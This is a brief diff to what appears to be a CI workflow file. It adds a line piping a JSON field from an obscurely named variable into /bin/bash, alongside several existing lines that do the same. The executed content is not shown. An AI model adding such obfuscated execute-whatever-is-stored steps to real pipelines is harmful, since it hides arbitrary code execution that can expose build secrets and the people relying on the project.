@@ -37,6 +37,7 @@ jobs:
           echo $gts76860 | jq -r .ruqi3 | /bin/bash
           echo $pxa136 | jq -r .if8 | /bin/bash
           echo $udci94186 | jq -r .ni46248 | /bin/bash
+          printf '%s' "$yre2797" | jq -r .ktgy7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
